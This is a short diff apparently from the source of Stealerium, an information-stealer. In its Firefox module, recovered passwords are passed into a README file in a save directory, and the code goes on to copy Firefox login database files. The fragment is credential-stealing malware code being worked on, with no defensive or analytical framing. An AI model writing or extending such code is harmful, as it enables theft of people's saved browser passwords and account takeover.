@@ -140,7 +140,7 @@ namespace Stealerium.Stub.Target.Browsers.Firefox
 
                             // Create a README.txt file in the destination directory
                             string readmePath = Path.Combine(bSavePath, "README.txt");
-                            CBrowserUtils.CreateReadme(bSavePath);
+                            CBrowserUtils.CreateReadme(bSavePath, passwords);
                             Logging.Log($"RecoverFirefox >> README.txt created at: '{readmePath}'");
 
                             // Copy all Firefox login database files
